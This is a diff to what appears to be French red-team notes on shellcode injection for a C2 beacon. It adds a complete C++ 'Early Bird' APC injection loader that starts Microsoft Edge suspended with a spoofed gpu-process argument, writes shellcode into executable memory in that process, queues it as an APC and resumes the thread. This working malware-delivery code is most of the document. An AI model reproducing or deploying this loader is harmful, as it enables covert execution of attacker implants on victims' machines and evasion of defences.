@@ -129,7 +129,7 @@ Avec `Sleep(INFINITE)`, le process reste en vie peu importe ce que fait le threa
 
 **En résumé** : `WaitForSingleObject(hThread)` marche avec un raw shellcode parce que _ce thread_ est le beacon. Avec RDLL, _ce thread_ est juste un intermédiaire - le vrai beacon vit ailleurs.
 
-## Classic injection
+# Classic injection
 ```cpp
 #include <Windows.h>
 #include "shellcode.h"
@@ -182,5 +182,72 @@ int main()
     // spawning the agent in its own thread. Sleep(INFINITE) keeps this process alive
     // regardless of what the shellcode thread does.
     Sleep(INFINITE);
+}
+```
+
+# Early Bird (APC)
+
+```cpp
+#include <Windows.h>
+#include "shellcode.h"
+
+int main()
+{
+    unsigned char* shellcode = agent_x64_bin;
+    unsigned int shellcode_len = agent_x64_bin_len;
+
+    STARTUPINFOW si = { 0 };
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+
+    PROCESS_INFORMATION pi = { 0 };
+
+    // spawn process in suspended state
+    CreateProcessW(
+        L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
+        (LPWSTR)L"\"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --type=gpu-process",
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_SUSPENDED,
+        NULL,
+        L"C:\\Windows\\System32",
+        &si,
+        &pi
+    );
+
+
+    // allocate a region of memory
+    auto hMemory = VirtualAllocEx(
+        pi.hProcess,    // handle to newly spawned process
+        NULL,
+        shellcode_len,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    );
+
+    // write the shellcode into memory
+    SIZE_T bytesWritten = 0;
+    WriteProcessMemory(
+        pi.hProcess,
+        hMemory,
+        shellcode,
+        shellcode_len,
+        &bytesWritten
+    );
+
+    // queue the apc
+    QueueUserAPC(
+        (PAPCFUNC)hMemory,
+        pi.hThread,
+        0
+    );
+
+    // resume the process
+    ResumeThread(pi.hThread);
+
+    // tidy up our handles
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
 }
 ```
